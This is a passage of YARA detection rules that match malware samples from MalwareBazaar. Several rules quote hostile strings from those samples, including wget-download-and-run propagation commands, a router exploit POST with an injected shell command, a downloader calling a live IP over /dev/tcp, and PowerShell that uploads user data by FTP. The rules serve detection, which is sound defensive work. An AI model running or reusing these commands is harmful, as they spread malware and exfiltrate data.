      $s9 = "lBrownieFeatureCustomActionActionSourceTargetExtendedTypeLaunchFileFeatureComponentsFeature_PropertyValueManufacturerSnobbery Fl" ascii
      $s10 = "eature table.Foreign key into Component table.Name of property, uppercase if settable by launcher or loader.String value for pro" ascii
      $s11 = " the default setting obtained from the Directory table.Remote execution option, one of irsEnumA conditional statement that will " ascii
      $s12 = "llowedFor foreign key, Name of table to which data must linkColumn to which foreign key connectsText;Formatted;Template;Conditio" ascii
      $s13 = "ber that determines the sort order in which the actions are to be executed.  Leave blank to suppress action.Optional expression " ascii
      $s14 = "This installer database contains the logic and data required to install Crosseye." fullword ascii
      $s15 = "unkyProductCode{A4D5D260-BC3C-4905-A008-87685F3200B7}ProductLanguageProductNameCrosseyeProductVersion2.2.2.0UpgradeCode{06B61E24" ascii
      $s16 = "7.yam|moose.yamlmoosekjtzeekg.vhd|tephroite.vhdtephroiteComponentComponentIdDirectory_ConditionKeyPath{A94A3233-111D-52C7-A546-B" ascii
      $s17 = "tify a particular component record.GuidA string GUID unique to this component, version, and language.Required key of a Directory" ascii
      $s18 = "g a visible feature item.Longer descriptive text describing a visible feature item.Numeric sort order, used to force a specific " ascii
      $s19 = "to detect the presence of the component and to return the path to it.Unique identifier for directory entry, primary key. If a pr" ascii
      $s20 = "Crosseye" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 28000KB and
      1 of ($x*) and 4 of them
}

rule e4a54cb4b1f662e128fca2e8a182a0551f5fc303fbe39fa18f3a8db687402a35 {
   meta:
      description = "evidences - file e4a54cb4b1f662e128fca2e8a182a0551f5fc303fbe39fa18f3a8db687402a35.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "e4a54cb4b1f662e128fca2e8a182a0551f5fc303fbe39fa18f3a8db687402a35"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii
      $x2 = "ws.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"X86\" publicKeyToken=\"6595b64144ccf1df\" language=\"*\" /></de" ascii
      $x3 = "<assemblyIdentity version=\"1.0.0.0\" processorArchitecture=\"X86\" name=\"Nullsoft.NSIS.exehead\" type=\"win32\"/><description>" ascii
      $s4 = "* qBji" fullword ascii
      $s5 = "Udxb!." fullword ascii
      $s6 = "i%yAFH%[g" fullword ascii
      $s7 = "ZE2.nTi" fullword ascii
      $s8 = "_5?h:\\" fullword ascii
      $s9 = "5YR.NUU" fullword ascii
      $s10 = "ZGU:\\n" fullword ascii
      $s11 = "nPQLB.LfFP" fullword ascii
      $s12 = "+CrunwyZ${" fullword ascii
      $s13 = "u:\\Eaq" fullword ascii
      $s14 = "4V0t.oxe" fullword ascii
      $s15 = "gd5H.not" fullword ascii
      $s16 = "2T9U.gxA" fullword ascii
      $s17 = "having to reboot your computer.$\\r$\\n$\\r$\\" fullword wide
      $s18 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii
      $s19 = "hKolOG" fullword ascii
      $s20 = "\\~'B* " fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 22000KB and
      1 of ($x*) and 4 of them
}

rule bf6846a1bf83a3da387f16bfca3f60064b2e4c94190337c0b034dfc491d8e2b2 {
   meta:
      description = "evidences - file bf6846a1bf83a3da387f16bfca3f60064b2e4c94190337c0b034dfc491d8e2b2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "bf6846a1bf83a3da387f16bfca3f60064b2e4c94190337c0b034dfc491d8e2b2"
   strings:
      $s1 = "PROT_EXEC|PROT_WRITE failed." fullword ascii
      $s2 = "t!&zc?/1" fullword ascii /* reversed goodware string '1/?cz&!t' */
      $s3 = "\\GETWOR_" fullword ascii
      $s4 = "* 0 xo" fullword ascii
      $s5 = "D@** /C" fullword ascii
      $s6 = "^~- /L" fullword ascii
      $s7 = "ItICCs%A%" fullword ascii
      $s8 = "stu%WRYvwr%WrxyzWr%WABC%Wr%DEr%WrFGHWr%WIJK%Wr%LMr%WrNOPWr%WQRS%Wr%TUr%WrVWX" fullword ascii
      $s9 = "RHcu%xSI%" fullword ascii
      $s10 = "dgjmpsy" fullword ascii
      $s11 = "rzbrrrrj" fullword ascii
      $s12 = "bdfhjlx" fullword ascii
      $s13 = "fhjlnpy" fullword ascii
      $s14 = "pqrstuy" fullword ascii
      $s15 = "dfhjlny" fullword ascii
      $s16 = "fjgvmfv" fullword ascii
      $s17 = "emxagging" fullword ascii
      $s18 = "ffghijq" fullword ascii
      $s19 = "jmpsvyy" fullword ascii
      $s20 = "fghijki" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 10000KB and
      8 of them
}

rule d7cfcbf5351dc257c5ce51718c76d85e64d4eb2f74ceab40a49a67bc5adff26d {
   meta:
      description = "evidences - file d7cfcbf5351dc257c5ce51718c76d85e64d4eb2f74ceab40a49a67bc5adff26d.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "d7cfcbf5351dc257c5ce51718c76d85e64d4eb2f74ceab40a49a67bc5adff26d"
   strings:
      $x1 = "        $Aliases = [System.Management.Automation.PSParser]::Tokenize($Payload,[ref]$null) | Where-Object {$_.Type -eq 'Command' " ascii
      $x2 = "        $Occurrences = [System.Management.Automation.PSParser]::Tokenize($Payload,[ref]$null) | Where-Object {$_.Type -eq 'Comma" ascii
      $x3 = "        $Blacklist = '$?', '$^', '$args', '$ConfirmPreference', '$ConsoleFileName', '$DebugPreference', '$Error', '$ErrorActionP" ascii
      $s4 = "        PS C:\\> Get-ReverseShell -Ip 127.0.0.1 -Port 4444 -Cmdlets -NamespaceClasses -Variables -OutFile obfuscated.ps1" fullword ascii
      $s5 = "        PS C:\\> Get-ReverseShell -Ip 127.0.0.1 -Port 4444" fullword ascii
      $s6 = "        $Aliases = [System.Management.Automation.PSParser]::Tokenize($Payload,[ref]$null) | Where-Object {$_.Type -eq 'Command' " ascii
      $s7 = "        $Occurrences = [System.Management.Automation.PSParser]::Tokenize($Payload,[ref]$null) | Where-Object {$_.Type -eq 'Numbe" ascii
      $s8 = "        PS C:\\> Find-Pipe -Payload 'value1'" fullword ascii
      $s9 = "        PS C:\\> Find-PipelineVariable -Payload 'Value1'" fullword ascii
      $s10 = "reference', '$ErrorView', '$ExecutionContext', '$false', '$FormatEnumerationLimit', '$HOME', '$Host', '$InformationPreference', " ascii
      $s11 = "        Resolves aliases within the payload to their proper name. The supported aliases are hardcoded into the function." fullword ascii
      $s12 = "        $Occurrences = [System.Management.Automation.PSParser]::Tokenize($Payload,[ref]$null) | Where-Object {$_.Type -eq 'Comma" ascii
      $s13 = "        PS C:\\> Find-Cmdlet -Payload 'Value1'" fullword ascii
      $s14 = "            $Payload = $Payload -replace \"\\b$A\\b\", $ResolvedCommand" fullword ascii
      $s15 = "With the way this framework is built, each component of the original payload goes through " fullword ascii
      $s16 = "            Write-Host \"[!] $($MyInvocation.MyCommand.Name) Error - $($_.Exception.Message) - Skipping\"" fullword ascii
      $s17 = "        PS C:\\> Find-Method -Payload 'Value1'" fullword ascii
      $s18 = "        PS C:\\> Find-String -Payload 'Value1'" fullword ascii
      $s19 = "nd' -and $_.Content -in $PossibleCmdlets} | Select-Object -ExpandProperty Content" fullword ascii
      $s20 = "        PS C:\\> Resolve-Aliases -Payload 'value1'" fullword ascii
   condition:
      uint16(0) == 0x7546 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule df80b2553ed6b8f3f9f49b27b436bc19f3f29d8d12e6f9e9cbae5b1b77e7e844 {
   meta:
      description = "evidences - file df80b2553ed6b8f3f9f49b27b436bc19f3f29d8d12e6f9e9cbae5b1b77e7e844.img"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "df80b2553ed6b8f3f9f49b27b436bc19f3f29d8d12e6f9e9cbae5b1b77e7e844"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s2 = "Ltabygld.exe" fullword wide
      $s3 = "get_KeyedBlocks" fullword ascii
      $s4 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s5 = "LTABYGLD.EXE;1" fullword ascii
      $s6 = "Ltabygld.exe;1" fullword wide
      $s7 = "<KeyedBlocks>k__BackingField" fullword ascii
      $s8 = "keyedBlocks" fullword wide
      $s9 = "ParseKeyedBlocks" fullword ascii
      $s10 = "set_KeyedBlocks" fullword ascii
      $s11 = "KeyedBlock" fullword ascii
      $s12 = "Expected '{', but found '}' - essentially this means there are more close braces than there are open braces." fullword wide
      $s13 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii
      $s14 = "get_CloseBraceCount" fullword ascii
      $s15 = "get_SourceLiteral" fullword ascii
      $s16 = "get_FormatterArguments" fullword ascii
      $s17 = "get_BlockText" fullword ascii
      $s18 = "get_SourceColumnNumber" fullword ascii
      $s19 = "get_Pluralizers" fullword ascii
      $s20 = "get_Irkmkeuuuh" fullword ascii
   condition:
      uint16(0) == 0x0000 and filesize < 4000KB and
      8 of them
}

rule sig_42854f517bd36eba51ee3dbf12c1537e74298b84fbcde9a612b02705a7f0fd81 {
   meta:
      description = "evidences - file 42854f517bd36eba51ee3dbf12c1537e74298b84fbcde9a612b02705a7f0fd81.dll"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "42854f517bd36eba51ee3dbf12c1537e74298b84fbcde9a612b02705a7f0fd81"
   strings:
      $s1 = "Runa.dll" fullword wide
      $s2 = "processAttributes" fullword ascii
      $s3 = ".NET Framework 4.6.2" fullword ascii
      $s4 = ".NETFramework,Version=v4.6.2" fullword ascii
      $s5 = "get_ceebfe576cf802948926ed283cb27da9f" fullword ascii
      $s6 = "threadAttributes" fullword ascii
      $s7 = "ConfuserEx v1.0.0" fullword ascii
      $s8 = " -]hU%+" fullword ascii
      $s9 = "System.IO.Compression" fullword ascii /* Goodware String - occured 51 times */
      $s10 = "protect" fullword ascii /* Goodware String - occured 53 times */
      $s11 = "CreateDecryptor" fullword ascii /* Goodware String - occured 76 times */
      $s12 = "payload" fullword ascii /* Goodware String - occured 89 times */
      $s13 = "LoadFile" fullword ascii /* Goodware String - occured 101 times */
      $s14 = "process" fullword ascii /* Goodware String - occured 171 times */
      $s15 = "Debugger" fullword ascii /* Goodware String - occured 244 times */
      $s16 = "System.Security.Cryptography" fullword ascii /* Goodware String - occured 305 times */
      $s17 = "Reverse" fullword ascii /* Goodware String - occured 338 times */
      $s18 = "MemoryStream" fullword ascii /* Goodware String - occured 420 times */
      $s19 = "Process" fullword ascii /* Goodware String - occured 571 times */
      $s20 = "Hashtable" fullword ascii /* Goodware String - occured 645 times */
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule sig_137c48d491535f13d43eb8e441a25eb4e88b82741c8b506c1ffe8c09714100b9 {
   meta:
      description = "evidences - file 137c48d491535f13d43eb8e441a25eb4e88b82741c8b506c1ffe8c09714100b9.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "137c48d491535f13d43eb8e441a25eb4e88b82741c8b506c1ffe8c09714100b9"
   strings:
      $s1 = ".mdebug.abi32" fullword ascii
      $s2 = "pppOec" fullword ascii
      $s3 = "\"T$fvX$" fullword ascii
      $s4 = "@$Bv`$" fullword ascii
      $s5 = "ff4Bfg" fullword ascii
      $s6 = "G7jg|c" fullword ascii
      $s7 = "\"T$FvX$" fullword ascii
      $s8 = "\"T$fvX" fullword ascii
      $s9 = " !$Q7l<" fullword ascii
      $s10 = "ff4Ifg" fullword ascii
      $s11 = "=_5 R]" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_206507792a57c90e8d1d4886b3032e2ab12732ee00703ba9b85a7316f38b3677 {
   meta:
      description = "evidences - file 206507792a57c90e8d1d4886b3032e2ab12732ee00703ba9b85a7316f38b3677.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "206507792a57c90e8d1d4886b3032e2ab12732ee00703ba9b85a7316f38b3677"
   strings:
      $s1 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p3 &" fullword ascii
      $s2 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p2" fullword ascii
      $s3 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p1" fullword ascii
      $s4 = "wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s.p4" fullword ascii
      $s5 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s6 = "crontab /tmp/crontab.tmp" fullword ascii
      $s7 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s8 = "sdwcrjw" fullword ascii
      $s9 = "pnubtoful" fullword ascii
      $s10 = "whpbucndl" fullword ascii
      $s11 = "cbinbc" fullword ascii
      $s12 = "torschpi" fullword ascii
      $s13 = "tbkaubw" fullword ascii
      $s14 = "nidhuubds" fullword ascii
      $s15 = "idhuubds" fullword ascii
      $s16 = "niqfknc" fullword ascii
      $s17 = "Cookie: user=admin" fullword ascii
      $s18 = "tsufdb" fullword ascii
      $s19 = "wuhcIhcb76" fullword ascii
      $s20 = "bifekb" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      8 of them
}

rule sig_3b004ef7eaf23f5cf52f6508362d1e4a2c5034570c8c1c2b60b2568c99302c66 {
   meta:
      description = "evidences - file 3b004ef7eaf23f5cf52f6508362d1e4a2c5034570c8c1c2b60b2568c99302c66.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "3b004ef7eaf23f5cf52f6508362d1e4a2c5034570c8c1c2b60b2568c99302c66"
   strings:
      $s1 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s2 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s3 = "Cookie: user=admin" fullword ascii
      $s4 = ".mdebug.abi32" fullword ascii
      $s5 = "pppOec" fullword ascii
      $s6 = "ff4Bfg" fullword ascii
      $s7 = "G7jg|c" fullword ascii
      $s8 = "ff4Ifg" fullword ascii
      $s9 = "=_5 R]" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_4c74ea37369faa8c6b8bda4921b7b47b16c3eeae07aa099d7023c1fb80e32bcb {
   meta:
      description = "evidences - file 4c74ea37369faa8c6b8bda4921b7b47b16c3eeae07aa099d7023c1fb80e32bcb.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "4c74ea37369faa8c6b8bda4921b7b47b16c3eeae07aa099d7023c1fb80e32bcb"
   strings:
      $s1 = ".mdebug.abi32" fullword ascii
      $s2 = "pppOec" fullword ascii
      $s3 = "ff4Bfg" fullword ascii
      $s4 = "G7jg|c" fullword ascii
      $s5 = "ff4Ifg" fullword ascii
      $s6 = "=_5 R]" fullword ascii
      $s7 = "@$Bv@$" fullword ascii
      $s8 = " !$Q7<<" fullword ascii
      $s9 = "\"T$fv8$" fullword ascii
      $s10 = "\"T$fv8" fullword ascii
      $s11 = "\"T$Fv8$" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_144d1a465511f24a1db9d9651873c8ac851cc7820628edc389d8c48c3039e030 {
   meta:
      description = "evidences - file 144d1a465511f24a1db9d9651873c8ac851cc7820628edc389d8c48c3039e030.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "144d1a465511f24a1db9d9651873c8ac851cc7820628edc389d8c48c3039e030"
   strings:
      $s1 = ".mdebug.abi32" fullword ascii
      $s2 = "hw|gj7" fullword ascii
      $s3 = "$7od($" fullword ascii
      $s4 = "$`~E&!" fullword ascii
      $s5 = "B4\\4c40" fullword ascii
      $s6 = "-TXcv[3" fullword ascii
      $s7 = "W9b*YG" fullword ascii
      $s8 = "nB4tPc4" fullword ascii
      $s9 = "pB4Oec4(" fullword ascii
      $s10 = "$|uc$8" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_6977df3439c1ca06794d591b3af31c2a4b6315c1cc8e90b6275e56c2e682c6dd {
   meta:
      description = "evidences - file 6977df3439c1ca06794d591b3af31c2a4b6315c1cc8e90b6275e56c2e682c6dd.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "6977df3439c1ca06794d591b3af31c2a4b6315c1cc8e90b6275e56c2e682c6dd"
   strings:
      $s1 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s" fullword ascii
      $s2 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s3 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s4 = "Cookie: user=admin" fullword ascii
      $s5 = ".mdebug.abi32" fullword ascii
      $s6 = "B4\\4c40" fullword ascii
      $s7 = "nB4tPc4" fullword ascii
      $s8 = "pB4Oec4(" fullword ascii
      $s9 = "]sD$j4" fullword ascii
      $s10 = "~Jv9\\C" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_6fdc8dc31ba2d6252353e7ef2e174018446469c94828bbba4ba02e11556e4867 {
   meta:
      description = "evidences - file 6fdc8dc31ba2d6252353e7ef2e174018446469c94828bbba4ba02e11556e4867.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "6fdc8dc31ba2d6252353e7ef2e174018446469c94828bbba4ba02e11556e4867"
   strings:
      $s1 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p3 &" fullword ascii
      $s2 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p2" fullword ascii
      $s3 = "cd /tmp; wget http://%d.%d.%d.%d/%s; chmod 777 %s; ./%s %s.p1" fullword ascii
      $s4 = "wget http://%d.%d.%d.%d/%s -O /tmp/%s; chmod 777 /tmp/%s; /tmp/%s %s.p4" fullword ascii
      $s5 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s6 = "crontab /tmp/crontab.tmp" fullword ascii
      $s7 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s8 = "sdwcrjw" fullword ascii
      $s9 = "pnubtoful" fullword ascii
      $s10 = "whpbucndl" fullword ascii
      $s11 = "cbinbc" fullword ascii
      $s12 = "torschpi" fullword ascii
      $s13 = "tbkaubw" fullword ascii
      $s14 = "nidhuubds" fullword ascii
      $s15 = "idhuubds" fullword ascii
      $s16 = "niqfknc" fullword ascii
      $s17 = "Cookie: user=admin" fullword ascii
      $s18 = "tsufdb" fullword ascii
      $s19 = "wuhcIhcb76" fullword ascii
      $s20 = "bifekb" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 400KB and
      8 of them
}

rule sig_7164fa956d113903e4addc703914762107010acc9c3e69f0b3f970348521920d {
   meta:
      description = "evidences - file 7164fa956d113903e4addc703914762107010acc9c3e69f0b3f970348521920d.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "7164fa956d113903e4addc703914762107010acc9c3e69f0b3f970348521920d"
   strings:
      $s1 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s2 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s3 = "Cookie: user=admin" fullword ascii
      $s4 = ".mdebug.abi32" fullword ascii
      $s5 = "hw|gj7" fullword ascii
      $s6 = "$7od($" fullword ascii
      $s7 = "B4\\4c40" fullword ascii
      $s8 = "-TXcv[3" fullword ascii
      $s9 = "W9b*YG" fullword ascii
      $s10 = "nB4tPc4" fullword ascii
      $s11 = "pB4Oec4(" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_88ce6e5523cea7f0cd90ad2d9e2f06c05a70297134c0400e04769e5a60d263b8 {
   meta:
      description = "evidences - file 88ce6e5523cea7f0cd90ad2d9e2f06c05a70297134c0400e04769e5a60d263b8.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "88ce6e5523cea7f0cd90ad2d9e2f06c05a70297134c0400e04769e5a60d263b8"
   strings:
      $s1 = "hw|gj7" fullword ascii
      $s2 = "$7od($" fullword ascii
      $s3 = "-TXcv[3" fullword ascii
      $s4 = "W9b*YG" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule b23dcc6497a813effc13c189df6c251399766754f1fc497c290c811d8133733c {
   meta:
      description = "evidences - file b23dcc6497a813effc13c189df6c251399766754f1fc497c290c811d8133733c.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "b23dcc6497a813effc13c189df6c251399766754f1fc497c290c811d8133733c"
   strings:
      $s1 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf /tmp/*; cd /tmp; wget http://%d.%d.%d.%d/2; chmod 777 2; ./2 lblink.selfrep;" fullword ascii
      $s2 = "POST /goform/set_LimitClient_cfg HTTP/1.1" fullword ascii
      $s3 = "Cookie: user=admin" fullword ascii
      $s4 = "hw|gj7" fullword ascii
      $s5 = "$7od($" fullword ascii
      $s6 = "-TXcv[3" fullword ascii
      $s7 = "W9b*YG" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule sig_19f89e0e352011aea4229b72c27784c2d7242cce4458dad1e029bb2156bfbf6f {
   meta:
      description = "evidences - file 19f89e0e352011aea4229b72c27784c2d7242cce4458dad1e029bb2156bfbf6f.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "19f89e0e352011aea4229b72c27784c2d7242cce4458dad1e029bb2156bfbf6f"
   strings:
      $s1 = "    echo -e \"GET /$1 HTTP/1.0\\r\\nHost: 87.121.86.234\\r\\n\\r\\n\" >&3" fullword ascii
      $s2 = "  wget http://87.121.86.234/$1 || curl -O http://87.121.86.234/$1" fullword ascii
      $s3 = "    exec 3<>\"/dev/tcp/87.121.86.234/80\"" fullword ascii
      $s4 = "  if cd \"$i\" && touch .testfile && (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 || truncate -s 2M .testfile2 >" ascii
      $s5 = "FOLDERS=$(eval find / -type d -user $(whoami) -perm -u=rwx -not -path \\\"/tmp/*\\\" -not -path \\\"/proc/*\\\" $EXCLUDE 2>/dev/" ascii
      $s6 = "  if cd \"$i\" && touch .testfile && (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 || truncate -s 2M .testfile2 >" ascii
      $s7 = "elif echo \"$ARCH\" | grep -q \"i[3456]86\"; then" fullword ascii
      $s8 = "elif echo \"$ARCH\" | grep -q \"armv8\" || echo \"$ARCH\" | grep -q \"aarch64\"; then" fullword ascii
      $s9 = "elif echo \"$ARCH\" | grep -q \"armv7\"; then" fullword ascii
      $s10 = "if echo \"$ARCH\" | grep -q \"x86_64\" || echo \"$ARCH\" | grep -q \"amd64\"; then" fullword ascii
      $s11 = "for dir in $NOEXEC_DIRS; do" fullword ascii
      $s12 = "NOEXEC_DIRS=$(cat /proc/mounts | grep 'noexec' | awk '{print $2}')" fullword ascii
      $s13 = "for i in $FOLDERS /tmp /var/tmp /dev/shm; do" fullword ascii
      $s14 = "    (while read -r line; do [ \"$line\" = $'\\r' ] && break; done && cat) <&3 >$1" fullword ascii
      $s15 = "rm -rf .redtail" fullword ascii
      $s16 = "  EXCLUDE=\"${EXCLUDE} -not -path \\\"$dir\\\" -not -path \\\"$dir/*\\\"\"" fullword ascii
      $s17 = "ARCH=$(uname -mp)" fullword ascii
      $s18 = "    exec 3>&-" fullword ascii
      $s19 = "  if [ $? -ne 0 ]; then" fullword ascii
      $s20 = "rm -rf clean" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 4KB and
      8 of them
}

rule sig_1ad73aed5b6f8b049fe60053551bab9a3e84e987ccb0866f80e47068b3d65f23 {
   meta:
      description = "evidences - file 1ad73aed5b6f8b049fe60053551bab9a3e84e987ccb0866f80e47068b3d65f23.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "1ad73aed5b6f8b049fe60053551bab9a3e84e987ccb0866f80e47068b3d65f23"
   strings:
      $s1 = "$naf = \"$([System.IO.Path]::GetRandomFileName()).txt\"" fullword ascii
      $s2 = "$client.Credentials = New-Object System.Net.NetworkCredential(\"if0_38048767\", \"HY6Z0ymhSXh\")" fullword ascii
      $s3 = "$client = New-Object System.Net.WebClient" fullword ascii
      $s4 = "$client.UploadFile(\"ftp://ftpupload.net/htdocs/$naf\", $f)" fullword ascii
      $s5 = "$f = \"$Env:temp\\$naf\"" fullword ascii
      $s6 = "$a = Invoke-RestMethod -Uri \"http://ipinfo.io\" | Select-Object -ExpandProperty ip" fullword ascii
      $s7 = "\"$Env:username\" >> $f" fullword ascii
      $s8 = "rd $f -force" fullword ascii
      $s9 = "$a >> $f" fullword ascii
   condition:
      uint16(0) == 0x6124 and filesize < 1KB and
      all of them
}

rule sig_1dcf3b607d2c9e181643dd6bf1fd85e39d3dc4f95b6992e5a435d0d900333416 {
   meta:
      description = "evidences - file 1dcf3b607d2c9e181643dd6bf1fd85e39d3dc4f95b6992e5a435d0d900333416.dmg"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily"
      date = "2025-01-09"
      hash1 = "1dcf3b607d2c9e181643dd6bf1fd85e39d3dc4f95b6992e5a435d0d900333416"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */
      $s2 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
      $s3 = "aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                       ' */
      $s4 = "BAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                       ' */
      $s5 = "AAAAAAAAAAEA" ascii /* base64 encoded string '       @' */
      $s6 = "AAAAAAAAAAAAAAD" ascii /* base64 encoded string '           ' */
      $s7 = "AAAAAAAAAAAAB" ascii /* base64 encoded string '         ' */
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAQAAAAAAAAAA" fullword ascii /* base64 encoded string '                      @ @       ' */
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAA" ascii /* base64 encoded string '                      @ ' */
      $s10 = "AAAAAAAAAAAAD" ascii /* base64 encoded string '         ' */
      $s11 = "aAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAA" ascii /* base64 encoded string '    @               @        ' */
      $s12 = "6AAAAAAAAAAA" ascii /* base64 encoded string '        ' */
      $s13 = "aAAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */
      $s14 = "AAAAAAAAAAAAAADYAAAAAAAAAAA=" fullword ascii /* base64 encoded string '          6        ' */
      $s15 = "AAAAAAAAAAAAAABnAAAAAAAAAAA=" fullword ascii /* base64 encoded string '           g        ' */
      $s16 = "8AAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */
      $s17 = "aAAAAAEAAAAAAAAAA" ascii /* base64 encoded string '    @       ' */
      $s18 = "AAAAAAAAAAAAACAAAAAAA" ascii /* base64 encoded string '               ' */
      $s19 = "@GetTEGut" fullword ascii
      $s20 = "<string>GPT Header (Primary GPT Header : 1)</string>" fullword ascii
   condition:
      uint16(0) == 0xda78 and filesize < 1000KB and
      8 of them
}

rule sig_31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429 {
   meta:
      description = "evidences - file 31f30a8b7270e00247b64c28cab661f23660c398d0da80b953e6587d58e4a429.unknown"
      author = "Sameer P Sheik"
